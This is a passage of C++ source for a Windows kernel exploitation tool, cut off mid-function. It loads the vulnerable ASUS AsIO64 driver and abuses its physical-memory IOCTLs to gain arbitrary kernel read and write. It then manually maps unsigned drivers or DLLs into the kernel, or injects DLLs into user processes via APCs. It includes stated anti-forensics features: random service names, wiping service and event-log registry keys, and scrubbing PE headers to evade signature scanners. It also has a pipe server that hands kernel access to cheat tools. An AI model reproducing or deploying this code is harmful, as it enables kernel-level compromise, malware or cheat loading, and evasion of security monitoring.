#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <sddl.h>

#include <algorithm>
#include <cctype>
#include <cmath>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cwctype>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <limits>
#include <memory>
#include <sstream>
#include <string>
#include <type_traits>
#include <unordered_map>
#include <unordered_set>
#include <vector>

#include "asio_r0_proto.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

namespace asio {

constexpr DWORD kIoctlMapPhysical = 0xA040244C;
constexpr DWORD kIoctlUnmapPhysical = 0xA0402450;
constexpr ULONG kPageSize = 0x1000;
constexpr ULONG kLowStubSize = 0x100000;

constexpr uint64_t kPhyAddressMask = 0x000ffffffffff000ull;
constexpr uint64_t kPhyAddressMask1Gb = 0x000fffffc0000000ull;
constexpr uint64_t kPhyAddressMask2Mb = 0x000fffffffe00000ull;
constexpr uint64_t kVirtualAddressMask1Gb = 0x000000003fffffffull;
constexpr uint64_t kVirtualAddressMask2Mb = 0x00000000001fffffull;
constexpr uint64_t kVirtualAddressMask4Kb = 0x0000000000000fffull;
constexpr uint64_t kEntryPresent = 1;
constexpr uint64_t kEntryPageSize = 0x80;

// Local AsIO64_D38774B8F812.sys uses the old MAPMEM-style input, not
// KDU's newer WINIO_PHYSICAL_MEMORY_INFO layout.
#pragma pack(push, 1)
struct MapRequest {
    ULONG InterfaceType;
    ULONG BusNumber;
    ULONGLONG BusAddress;
    ULONG AddressSpace;
    ULONG Length;
};
#pragma pack(pop)
static_assert(sizeof(MapRequest) == 0x18, "Unexpected AsIO64 map request layout");

struct MappedPhysical {
    void* Address = nullptr;
    size_t Size = 0;
};

struct MemoryRegion {
    uintptr_t Base = 0;
    uintptr_t AllocationBase = 0;
    size_t Size = 0;
    DWORD State = 0;
    DWORD Type = 0;
};

using NtQuerySystemInformationFn = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);

struct RtlProcessModuleInformation {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
};

struct RtlProcessModules {
    ULONG NumberOfModules;
    RtlProcessModuleInformation Modules[1];
};

struct RelocInfo {
    uint64_t Address;
    USHORT* Item;
    ULONG Count;
};

struct ImportFunctionInfo {
    std::string Name;
    uint64_t* Address;
    bool ByOrdinal = false;
    WORD Ordinal = 0;
};

struct ImportInfo {
    std::string ModuleName;
    std::vector<ImportFunctionInfo> Functions;
};

struct CachedTargetExport {
    std::string Name;
    uint64_t Address = 0;
    bool IsForward = false;
    std::string ForwardTarget;
};

struct CachedTargetModuleExports {
    uint64_t ModuleBase = 0;
    uint64_t Cr3 = 0;
    uint64_t Peb = 0;
    uint64_t ExportDirRva = 0;
    uint64_t ExportDirSize = 0;
    std::vector<CachedTargetExport> Exports;
};

static std::unordered_map<uint64_t, CachedTargetModuleExports> g_targetExportCache;

struct MapperOptions {
    bool FreeAfterEntry = false;
    bool DestroyHeader = true;
    bool PassAllocationPtr = false;
    bool PersistDriver = false;
    // When true, treat the image as a DLL and invoke
    //   DllMain(kernelImageBase, DLL_PROCESS_ATTACH, NULL)
    // from kernel context. DestroyHeader is forced off in this mode so
    // exports remain reachable for post-DllMain calls.
    bool IsDllImage = false;
    uint64_t Param1 = 0;
    uint64_t Param2 = 0;
};

enum class RunMode {
    KernelDriver,
    // Manual-map a DLL into kernel non-paged pool and call DllMain in R0.
    // Imports must resolve against ntoskrnl / other kernel modules.
    KernelDll,
    // Map a DLL into a user-mode target process (R3) but trigger DllMain
    // through a kernel-built APC instead of CreateRemoteThread. The DLL
    // can keep its user-mode imports (user32, kernel32, ...).
    RemoteProcessDll
};

struct CliOptions {
    std::wstring AsioPath;
    std::wstring ServiceName = L"AsIO64Lite";
    std::wstring TargetPath;
    RunMode Mode = RunMode::KernelDriver;
    // Optional named export to invoke after DllMain (R0 DLL mode).
    std::string DllExportName;
    bool KeepAsio = false;
    bool ShowHelp = false;
    // Cross-process injection target for RemoteProcessDll mode: either
    // explicit PID, or process name (e.g. sublime_text.exe).
    DWORD TargetPid = 0;
    std::wstring TargetProcessName;
    // Optional output path. If set, before/instead-of injecting we dump the
    // target's main image (SizeOfImage bytes from its load base) to disk.
    // Useful for snapshotting a UE game right before injecting Dumper-7.
    std::wstring DumpExePath;
    // Anti-forensics / OpSec flags.
    bool RandomizeService   = false;  // replace service name with random GUID
    bool CopyDrvToTemp      = false;  // copy .sys to %TEMP% with random name before loading
    bool SweepRegistry      = false;  // deep-clean leftover service registry keys
    bool CleanInit          = false;  // zero INIT section in kernel memory after entry returns
    bool PersistDriver      = false;  // don't free kernel allocation after entry returns
    // Post-inject header scrub: after DllMain has been triggered, zero the
    // MZ/PE/section headers of the injected DLL in the target's address
    // space. A signature scanner walking the target's pages will no longer
    // recognize the region as a loaded image.
    bool ScrubHeaders       = false;
    // Long-lived IPC server mode. After AsIO64 is loaded and probed, listen
    // on ASIO_R0_DEFAULT_PIPE_W (\\.\pipe\asio_r0_probe) and serve R0
    // read/write/inject ops to external clients (CheatEngine, UEDumper, ...)
    // until --shutdown is received.
    bool ServerMode         = false;
    std::wstring PipeName   = ASIO_R0_DEFAULT_PIPE_W;
    MapperOptions Mapper;
};

static std::wstring LastErrorMessage(DWORD error = GetLastError()) {
    wchar_t* buffer = nullptr;
    const DWORD flags = FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;
    const DWORD length = FormatMessageW(flags, nullptr, error, 0, reinterpret_cast<LPWSTR>(&buffer), 0, nullptr);
    std::wstring result = length ? std::wstring(buffer, length) : L"unknown error";
    if (buffer) {
        LocalFree(buffer);
    }
    while (!result.empty() && (result.back() == L'\r' || result.back() == L'\n' || result.back() == L' ')) {
        result.pop_back();
    }
    return result;
}

static void PrintWin32Error(const wchar_t* prefix, DWORD error = GetLastError()) {
    std::wcerr << prefix << L" failed, error " << error << L": " << LastErrorMessage(error) << std::endl;
}

static bool IsProcessElevated() {
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return false;
    }
    TOKEN_ELEVATION elevation{};
    DWORD returned = 0;
    const BOOL ok = GetTokenInformation(token, TokenElevation, &elevation,
                                        sizeof(elevation), &returned);
    CloseHandle(token);
    return ok && elevation.TokenIsElevated != 0;
}

static std::wstring GetCurrentDirectoryString() {
    DWORD length = GetCurrentDirectoryW(0, nullptr);
    std::wstring path(length, L'\0');
    DWORD written = GetCurrentDirectoryW(length, path.data());
    path.resize(written);
    return path;
}

static std::wstring GetModuleDirectory() {
    std::wstring path(MAX_PATH, L'\0');
    DWORD written = GetModuleFileNameW(nullptr, path.data(), static_cast<DWORD>(path.size()));
    while (written == path.size()) {
        path.resize(path.size() * 2);
        written = GetModuleFileNameW(nullptr, path.data(), static_cast<DWORD>(path.size()));
    }
    path.resize(written);
    const size_t pos = path.find_last_of(L"\\/");
    return pos == std::wstring::npos ? L"." : path.substr(0, pos);
}

static std::wstring JoinPath(const std::wstring& left, const std::wstring& right) {
    if (left.empty()) {
        return right;
    }
    if (left.back() == L'\\' || left.back() == L'/') {
        return left + right;
    }
    return left + L"\\" + right;
}

static std::wstring ParentDirectory(const std::wstring& path) {
    if (path.empty()) {
        return {};
    }
    size_t end = path.find_last_not_of(L"\\/");
    if (end == std::wstring::npos) {
        return {};
    }
    size_t pos = path.find_last_of(L"\\/", end);
    if (pos == std::wstring::npos) {
        return {};
    }
    if (pos == 2 && path.size() >= 3 && path[1] == L':') {
        return path.substr(0, 3);
    }
    return path.substr(0, pos);
}

static std::wstring FullPath(const std::wstring& path) {
    DWORD needed = GetFullPathNameW(path.c_str(), 0, nullptr, nullptr);
    if (!needed) {
        return path;
    }
    std::wstring result(needed, L'\0');
    DWORD written = GetFullPathNameW(path.c_str(), needed, result.data(), nullptr);
    result.resize(written);
    return result;
}

static bool FileExists(const std::wstring& path) {
    DWORD attributes = GetFileAttributesW(path.c_str());
    return attributes != INVALID_FILE_ATTRIBUTES && !(attributes & FILE_ATTRIBUTE_DIRECTORY);
}

static std::wstring FindDefaultAsioPath() {
    const std::wstring rel = L"Byovd_Driver\\AsIO64_D38774B8F812.sys\\AsIO64_D38774B8F812.sys";
    std::vector<std::wstring> bases = { GetCurrentDirectoryString(), GetModuleDirectory() };

    for (std::wstring base : bases) {
        for (int i = 0; i < 6 && !base.empty(); ++i) {
            const std::wstring candidate = FullPath(JoinPath(base, rel));
            if (FileExists(candidate)) {
                return candidate;
            }
            const std::wstring parent = ParentDirectory(base);
            if (parent == base) {
                break;
            }
            base = parent;
        }
    }

    return {};
}

static bool ReadFileBytes(const std::wstring& path, std::vector<uint8_t>& out) {
    HANDLE file = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        PrintWin32Error(L"CreateFileW(target)");
        return false;
    }

    LARGE_INTEGER size{};
    if (!GetFileSizeEx(file, &size) || size.QuadPart <= 0 || size.QuadPart > std::numeric_limits<DWORD>::max()) {
        CloseHandle(file);
        std::wcerr << L"[-] Invalid file size: " << path << std::endl;
        return false;
    }

    out.resize(static_cast<size_t>(size.QuadPart));
    DWORD read = 0;
    const BOOL ok = ReadFile(file, out.data(), static_cast<DWORD>(out.size()), &read, nullptr);
    CloseHandle(file);
    if (!ok || read != out.size()) {
        PrintWin32Error(L"ReadFile(target)");
        return false;
    }
    return true;
}

static uint64_t ParseInteger(const std::wstring& value) {
    wchar_t* end = nullptr;
    const uint64_t parsed = wcstoull(value.c_str(), &end, 0);
    if (!end || *end != L'\0') {
        throw std::runtime_error("invalid integer argument");
    }
    return parsed;
}

static std::string NarrowAscii(const std::wstring& value) {
    std::string result;
    result.reserve(value.size());
    for (wchar_t ch : value) {
        if (ch < 0 || ch > 0x7f) {
            throw std::runtime_error("non-ascii argument");
        }
        result.push_back(static_cast<char>(ch));
    }
    return result;
}

static NtQuerySystemInformationFn NtQuerySystemInformationPtr() {
    static NtQuerySystemInformationFn fn = []() -> NtQuerySystemInformationFn {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            ntdll = LoadLibraryW(L"ntdll.dll");
        }
        return ntdll ? reinterpret_cast<NtQuerySystemInformationFn>(GetProcAddress(ntdll, "NtQuerySystemInformation")) : nullptr;
    }();
    return fn;
}

static std::vector<MemoryRegion> SnapshotMemory() {
    SYSTEM_INFO si{};
    GetNativeSystemInfo(&si);

    std::vector<MemoryRegion> regions;
    uintptr_t address = reinterpret_cast<uintptr_t>(si.lpMinimumApplicationAddress);
    const uintptr_t maxAddress = reinterpret_cast<uintptr_t>(si.lpMaximumApplicationAddress);

    while (address < maxAddress) {
        MEMORY_BASIC_INFORMATION mbi{};
        if (VirtualQuery(reinterpret_cast<LPCVOID>(address), &mbi, sizeof(mbi)) != sizeof(mbi)) {
            address += 0x10000;
            continue;
        }

        const uintptr_t base = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        const uintptr_t next = base + mbi.RegionSize;
        if (mbi.State != MEM_FREE) {
            regions.push_back({
                base,
                reinterpret_cast<uintptr_t>(mbi.AllocationBase),
                mbi.RegionSize,
                mbi.State,
                mbi.Type
            });
        }

        if (next <= address) {
            break;
        }
        address = next;
    }

    return regions;
}

static void* ResolveNewMappingPointer(const std::vector<MemoryRegion>& before, uint32_t returnedLow32) {
    std::unordered_set<uintptr_t> oldAllocations;
    oldAllocations.reserve(before.size());
    for (const auto& region : before) {
        oldAllocations.insert(region.AllocationBase);
    }

    const std::vector<MemoryRegion> after = SnapshotMemory();
    for (const auto& region : after) {
        if (region.State != MEM_COMMIT) {
            continue;
        }
        if (oldAllocations.find(region.AllocationBase) != oldAllocations.end()) {
            continue;
        }
        if (region.Type != MEM_MAPPED && region.Type != MEM_PRIVATE) {
            continue;
        }

        const uint32_t regionLow32 = static_cast<uint32_t>(region.Base);
        const uint32_t delta32 = returnedLow32 - regionLow32;
        const size_t delta = static_cast<size_t>(delta32);
        if (delta < region.Size) {
            return reinterpret_cast<void*>(region.Base + delta);
        }
    }

    void* direct = reinterpret_cast<void*>(static_cast<uintptr_t>(returnedLow32));
    MEMORY_BASIC_INFORMATION mbi{};
    if (direct && VirtualQuery(direct, &mbi, sizeof(mbi)) == sizeof(mbi) && mbi.State == MEM_COMMIT) {
        return direct;
    }

    return nullptr;
}

class ServiceHandle {
public:
    ServiceHandle() = default;
    explicit ServiceHandle(SC_HANDLE handle) : handle_(handle) {}
    ~ServiceHandle() {
        if (handle_) {
            CloseServiceHandle(handle_);
        }
    }
    ServiceHandle(const ServiceHandle&) = delete;
    ServiceHandle& operator=(const ServiceHandle&) = delete;
    ServiceHandle(ServiceHandle&& other) noexcept : handle_(other.handle_) {
        other.handle_ = nullptr;
    }
    ServiceHandle& operator=(ServiceHandle&& other) noexcept {
        if (this != &other) {
            if (handle_) {
                CloseServiceHandle(handle_);
            }
            handle_ = other.handle_;
            other.handle_ = nullptr;
        }
        return *this;
    }
    SC_HANDLE get() const { return handle_; }

private:
    SC_HANDLE handle_ = nullptr;
};

static std::wstring RandomName(size_t length = 16) {
    // Generate a random alphanumeric wide string. For name obfuscation only —
    // we're avoiding static-pattern matches, not doing crypto.
    static const wchar_t kAlphabet[] =
        L"abcdefghijklmnopqrstuvwxyz0123456789";
    constexpr size_t kAlphaLen = sizeof(kAlphabet) / sizeof(kAlphabet[0]) - 1;

    LARGE_INTEGER tick{};
    QueryPerformanceCounter(&tick);
    uint64_t seed = static_cast<uint64_t>(tick.QuadPart) ^
                    static_cast<uint64_t>(GetCurrentProcessId()) ^
                    (static_cast<uint64_t>(GetCurrentThreadId()) << 16);
    // Quick LCG: seed = seed * 6364136223846793005ull + 1442695040888963407ull
    auto xorshift = [&]() -> uint32_t {
        seed ^= seed >> 12;
        seed ^= seed << 25;
        seed ^= seed >> 27;
        return static_cast<uint32_t>(seed * 0x2545F4914F6CDD1Dull);
    };

    std::wstring name(length, L'\0');
    for (auto& ch : name) {
        ch = kAlphabet[xorshift() % kAlphaLen];
    }
    return name;
}

static std::wstring CopyDriverToTemp(const std::wstring& srcPath) {
    std::wstring temp(MAX_PATH, L'\0');
    DWORD len = GetTempPathW(static_cast<DWORD>(temp.size()), temp.data());
    temp.resize(len);
    const std::wstring dest = temp + RandomName(12) + L".sys";
    if (!CopyFileW(srcPath.c_str(), dest.c_str(), FALSE)) {
        PrintWin32Error(L"CopyFileW(driver to temp)");
        return {};
    }
    return dest;
}

static bool LoadKernelDriverService(const std::wstring& driverPath, const std::wstring& serviceName, bool& createdService) {
    createdService = false;
    const std::wstring fullPath = FullPath(driverPath);
    if (!IsProcessElevated()) {
        std::wcerr << L"[-] Administrator privileges are required to load the AsIO64 kernel driver." << std::endl;
        std::wcerr << L"    Start PowerShell/CMD with 'Run as administrator', then run the same command again." << std::endl;
        return false;
    }

    ServiceHandle scm(OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE));
    if (!scm.get()) {
        if (GetLastError() == ERROR_ACCESS_DENIED) {
            std::wcerr << L"[-] OpenSCManagerW denied access. This process is not elevated enough to create/start a driver service." << std::endl;
            std::wcerr << L"    Use an elevated administrator terminal." << std::endl;
        }
        PrintWin32Error(L"OpenSCManagerW");
        return false;
    }

    ServiceHandle service(CreateServiceW(
        scm.get(),
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        fullPath.c_str(),
        nullptr,
        nullptr,
        nullptr,
        nullptr,
        nullptr));

    if (!service.get()) {
        const DWORD error = GetLastError();
        if (error != ERROR_SERVICE_EXISTS) {
            PrintWin32Error(L"CreateServiceW", error);
            return false;
        }

        service = ServiceHandle(OpenServiceW(
            scm.get(),
            serviceName.c_str(),
            SERVICE_START | SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE));
        if (!service.get()) {
            PrintWin32Error(L"OpenServiceW");
            return false;
        }
    } else {
        createdService = true;
    }

    if (!StartServiceW(service.get(), 0, nullptr)) {
        const DWORD error = GetLastError();
        if (error != ERROR_SERVICE_ALREADY_RUNNING) {
            PrintWin32Error(L"StartServiceW", error);
            if (createdService) {
                DeleteService(service.get());
                createdService = false;
            }
            return false;
        }
    }

    return true;
}

static void StopAndDeleteKernelDriverService(const std::wstring& serviceName) {
    ServiceHandle scm(OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT));
    if (!scm.get()) {
        return;
    }

    ServiceHandle service(OpenServiceW(scm.get(), serviceName.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE));
    if (!service.get()) {
        return;
    }

    SERVICE_STATUS_PROCESS status{};
    DWORD needed = 0;
    if (QueryServiceStatusEx(service.get(), SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&status), sizeof(status), &needed)) {
        if (status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING) {
            SERVICE_STATUS ignored{};
            ControlService(service.get(), SERVICE_CONTROL_STOP, &ignored);
            for (int i = 0; i < 20; ++i) {
                Sleep(100);
                if (!QueryServiceStatusEx(service.get(), SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&status), sizeof(status), &needed)) {
                    break;
                }
                if (status.dwCurrentState == SERVICE_STOPPED) {
                    break;
                }
            }
        }
    }

    DeleteService(service.get());
}

static void SweepServiceRegistry(const std::wstring& serviceName) {
    // After DeleteService the SCM removes the canonical service key, but
    // some enumerations / event-log redirects / stale ControlSetNNN copies
    // can survive. Walk every ControlSet and nuke the service subkey.
    // Also purge the event-log registration under
    // HKLM\SYSTEM\CurrentControlSet\Services\EventLog\System\<ServiceName>.
    std::wcout << L"[*] Sweeping registry for service: " << serviceName << std::endl;

    const wchar_t* roots[] = {
        L"SYSTEM\\CurrentControlSet\\Services",
        L"SYSTEM\\ControlSet001\\Services",
        L"SYSTEM\\ControlSet002\\Services",
        L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\System",
    };
    for (auto* root : roots) {
        std::wstring subkey = std::wstring(root) + L"\\" + serviceName;
        LSTATUS s = RegDeleteTreeW(HKEY_LOCAL_MACHINE, subkey.c_str());
        if (s == ERROR_SUCCESS) {
            std::wcout << L"    [+] purged HKLM\\" << subkey << std::endl;
        } else if (s != ERROR_FILE_NOT_FOUND) {
            std::wcout << L"    [-] HKLM\\" << subkey << L" delete failed: " << s << std::endl;
        }
    }
}

class AsioProvider {
public:
    ~AsioProvider() {
        Close();
    }

    bool Open() {
        Close();
        device_ = CreateFileW(
            L"\\\\.\\Asusgio",
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr);

        if (device_ == INVALID_HANDLE_VALUE) {
            device_ = nullptr;
            return false;
        }
        return true;
    }

    void Close() {
        if (device_) {
            CloseHandle(device_);
            device_ = nullptr;
        }
    }

    void SetNtoskrnlBase(uint64_t base) {
        ntoskrnlBase_ = base;
    }

    void SetLowStubAnchor(uint64_t anchor) {
        lowStubAnchor_ = anchor;
    }

    uint64_t LowStubAnchor() const {
        return lowStubAnchor_;
    }

    uint64_t NtoskrnlBase() const {
        return ntoskrnlBase_;
    }

    bool MapPhysical(uint64_t physicalAddress, size_t size, MappedPhysical& out) {
        if (!device_ || !size || size > std::numeric_limits<ULONG>::max()) {
            return false;
        }

        const auto before = SnapshotMemory();
        MapRequest request{};
        request.InterfaceType = 0; // Internal
        request.BusNumber = 0;
        request.BusAddress = physicalAddress;
        request.AddressSpace = 0; // memory space
        request.Length = static_cast<ULONG>(size);

        uint64_t returnedAddress = 0;
        DWORD returned = 0;
        if (!DeviceIoControl(
            device_,
            kIoctlMapPhysical,
            &request,
            sizeof(request),
            &returnedAddress,
            sizeof(returnedAddress),
            &returned,
            nullptr)) {
            PrintWin32Error(L"DeviceIoControl(AsIO map)");
            return false;
        }

        void* resolved = ResolveNewMappingPointer(before, static_cast<uint32_t>(returnedAddress));
        if (!resolved) {
            std::wcerr << L"[-] AsIO map succeeded but the user mapping pointer could not be resolved. "
                       << L"Returned low32=0x" << std::hex << static_cast<uint32_t>(returnedAddress) << std::dec << std::endl;
            return false;
        }

        out.Address = resolved;
        out.Size = size;
        return true;
    }

    void UnmapPhysical(MappedPhysical& mapping) {
        if (!device_ || !mapping.Address) {
            return;
        }

        void* input = mapping.Address;
        DWORD returned = 0;
        DeviceIoControl(
            device_,
            kIoctlUnmapPhysical,
            &input,
            sizeof(input),
            nullptr,
            0,
            &returned,
            nullptr);

        mapping.Address = nullptr;
        mapping.Size = 0;
    }

    bool ReadPhysical(uint64_t physicalAddress, void* buffer, size_t size) {
        if (!buffer && size) {
            return false;
        }

        uint8_t* output = static_cast<uint8_t*>(buffer);
        size_t done = 0;
        while (done < size) {
            const uint64_t current = physicalAddress + done;
            const size_t pageOffset = static_cast<size_t>(current & (kPageSize - 1));
            const size_t chunk = std::min(size - done, static_cast<size_t>(kPageSize - pageOffset));
            const uint64_t pageBase = current & ~(static_cast<uint64_t>(kPageSize) - 1);

            MappedPhysical mapping{};
            if (!MapPhysical(pageBase, pageOffset + chunk, mapping)) {
                return false;
            }

            std::memcpy(output + done, static_cast<uint8_t*>(mapping.Address) + pageOffset, chunk);
            UnmapPhysical(mapping);
            done += chunk;
        }

        return true;
    }

    bool WritePhysical(uint64_t physicalAddress, const void* buffer, size_t size) {
        if (!buffer && size) {
            return false;
        }

        const uint8_t* input = static_cast<const uint8_t*>(buffer);
        size_t done = 0;
        while (done < size) {
            const uint64_t current = physicalAddress + done;
            const size_t pageOffset = static_cast<size_t>(current & (kPageSize - 1));
            const size_t chunk = std::min(size - done, static_cast<size_t>(kPageSize - pageOffset));
            const uint64_t pageBase = current & ~(static_cast<uint64_t>(kPageSize) - 1);

            MappedPhysical mapping{};
            if (!MapPhysical(pageBase, pageOffset + chunk, mapping)) {
                return false;
            }

            std::memcpy(static_cast<uint8_t*>(mapping.Address) + pageOffset, input + done, chunk);
            UnmapPhysical(mapping);
            done += chunk;
        }

        return true;
    }

    bool QueryPml4(uint64_t& pml4) {
        if (pml4_) {
            pml4 = pml4_;
            return true;
        }

        MappedPhysical lowStub{};
        if (!MapPhysical(0, kLowStubSize, lowStub)) {
            std::wcerr << L"[-] Failed to map low 1MB for CR3 discovery" << std::endl;
            return false;
        }

        const auto* base = static_cast<const uint8_t*>(lowStub.Address);
        uint64_t found = 0;
        for (ULONG offset = kPageSize; offset + 0xA8 < kLowStubSize; offset += kPageSize) {
            const uint64_t jmp = *reinterpret_cast<const uint64_t*>(base + offset);
            if ((jmp & 0xffffffffffff00ffull) != 0x00000001000600E9ull) {
                continue;
            }

            const uint64_t lmTarget = *reinterpret_cast<const uint64_t*>(base + offset + 0x70);
            if ((lmTarget & 0xfffff80000000003ull) != 0xfffff80000000000ull) {
                continue;
            }

            const uint64_t cr3 = *reinterpret_cast<const uint64_t*>(base + offset + 0xA0);
            if (cr3 & 0xffffff0000000fffull) {
                continue;
            }

            found = cr3;
            lowStubAnchor_ = lmTarget;
            break;
        }

        UnmapPhysical(lowStub);
        if (!found) {
            std::wcerr << L"[-] Could not find kernel CR3 in low stub" << std::endl;
            return false;
        }

        pml4_ = found;
        pml4 = found;
        std::wcout << L"[+] Kernel CR3/PML4: 0x" << std::hex << pml4_ << std::dec << std::endl;
        return true;
    }

    bool VirtualToPhysical(uint64_t virtualAddress, uint64_t& physicalAddress) {
        uint64_t pml4 = 0;
        if (!QueryPml4(pml4)) {
            return false;
        }

        uint64_t table = pml4 & kPhyAddressMask;
        for (int level = 0; level < 4; ++level) {
            const int shift = 39 - (level * 9);
            const uint64_t selector = (virtualAddress >> shift) & 0x1ff;

            uint64_t entry = 0;
            if (!ReadPhysical(table + selector * sizeof(uint64_t), &entry, sizeof(entry))) {
                return false;
            }

            if (!(entry & kEntryPresent)) {
                return false;
            }

            table = entry & kPhyAddressMask;
            if (entry & kEntryPageSize) {
                if (level == 1) {
                    physicalAddress = (entry & kPhyAddressMask1Gb) + (virtualAddress & kVirtualAddressMask1Gb);
                    return true;
                }

                if (level == 2) {
                    physicalAddress = (entry & kPhyAddressMask2Mb) + (virtualAddress & kVirtualAddressMask2Mb);
                    return true;
                }
            }
        }

        physicalAddress = table + (virtualAddress & kVirtualAddressMask4Kb);
        return true;
    }

    bool ReadKernelMemory(uint64_t address, void* buffer, size_t size) {
        if (!size) {
            return true;
        }
        if (!address || !buffer) {
            return false;
        }

        uint8_t* output = static_cast<uint8_t*>(buffer);
        size_t done = 0;
        while (done < size) {
            const uint64_t current = address + done;
            const size_t pageOffset = static_cast<size_t>(current & (kPageSize - 1));
            const size_t chunk = std::min(size - done, static_cast<size_t>(kPageSize - pageOffset));

            uint64_t physical = 0;
            if (!VirtualToPhysical(current, physical)) {
                return false;
            }

            if (!ReadPhysical(physical, output + done, chunk)) {
                return false;
            }
            done += chunk;
        }

        return true;
    }

    bool WriteKernelMemory(uint64_t address, const void* buffer, size_t size) {
        if (!size) {
            return true;
        }
        if (!address || !buffer) {
            return false;
        }

        const uint8_t* input = static_cast<const uint8_t*>(buffer);
        size_t done = 0;
        while (done < size) {
            const uint64_t current = address + done;
            const size_t pageOffset = static_cast<size_t>(current & (kPageSize - 1));
            const size_t chunk = std::min(size - done, static_cast<size_t>(kPageSize - pageOffset));

            uint64_t physical = 0;
            if (!VirtualToPhysical(current, physical)) {
                return false;
            }

            if (!WritePhysical(physical, input + done, chunk)) {
                return false;
            }
            done += chunk;
        }

        return true;
    }

    bool WriteToReadOnlyMemory(uint64_t address, const void* buffer, size_t size) {
        return WriteKernelMemory(address, buffer, size);
    }

    uint64_t GetKernelModuleExport(uint64_t moduleBase, const std::string& functionName) {
        if (!moduleBase) {
            return 0;
        }

        IMAGE_DOS_HEADER dos{};
        IMAGE_NT_HEADERS64 nt{};
        if (!ReadKernelMemory(moduleBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
            return 0;
        }
        if (!ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) {
            return 0;
        }

        const auto& exportDirData = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!exportDirData.VirtualAddress || !exportDirData.Size) {
            return 0;
        }

        std::vector<uint8_t> exportData(exportDirData.Size);
        if (!ReadKernelMemory(moduleBase + exportDirData.VirtualAddress, exportData.data(), exportData.size())) {
            return 0;
        }

        const uintptr_t exportStart = reinterpret_cast<uintptr_t>(exportData.data());
        const uintptr_t exportEnd = exportStart + exportData.size();
        auto rvaToPtr = [&](DWORD rva) -> void* {
            if (rva < exportDirData.VirtualAddress) {
                return nullptr;
            }
            const DWORD offset = rva - exportDirData.VirtualAddress;
            if (offset >= exportData.size()) {
                return nullptr;
            }
            return exportData.data() + offset;
        };

        auto* exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(exportData.data());
        auto* nameTable = reinterpret_cast<DWORD*>(rvaToPtr(exports->AddressOfNames));
        auto* ordinalTable = reinterpret_cast<WORD*>(rvaToPtr(exports->AddressOfNameOrdinals));
        auto* functionTable = reinterpret_cast<DWORD*>(rvaToPtr(exports->AddressOfFunctions));
        if (!nameTable || !ordinalTable || !functionTable) {
            return 0;
        }

        for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
            const DWORD nameRva = nameTable[i];
            const char* name = static_cast<const char*>(rvaToPtr(nameRva));
            if (!name) {
                continue;
            }

            size_t length = 0;
            while (reinterpret_cast<uintptr_t>(name + length) < exportEnd && name[length]) {
                ++length;
            }
            if (reinterpret_cast<uintptr_t>(name + length) >= exportEnd) {
                continue;
            }

            if (_stricmp(std::string(name, length).c_str(), functionName.c_str()) != 0) {
                continue;
            }

            const WORD ordinal = ordinalTable[i];
            if (ordinal >= exports->NumberOfFunctions) {
                return 0;
            }

            const DWORD functionRva = functionTable[ordinal];
            if (functionRva <= 0x1000) {
                return 0;
            }
            if (functionRva >= exportDirData.VirtualAddress &&
                functionRva < exportDirData.VirtualAddress + exportDirData.Size) {
                return 0;
            }

            return moduleBase + functionRva;
        }

        return 0;
    }

    uint64_t AllocatePool(uint64_t size) {
        if (!size || !ntoskrnlBase_) {
            return 0;
        }

        if (!kernelExAllocatePoolWithTag_) {
            kernelExAllocatePoolWithTag_ = GetKernelModuleExport(ntoskrnlBase_, "ExAllocatePoolWithTag");
        }
        if (!kernelExAllocatePoolWithTag_) {
            std::wcerr << L"[-] Failed to resolve ExAllocatePoolWithTag" << std::endl;
            return 0;
        }

        uint64_t allocated = 0;
        constexpr ULONG nonPagedPool = 0;
        constexpr ULONG poolTag = ('A') | ('S' << 8) | ('I' << 16) | ('O' << 24);
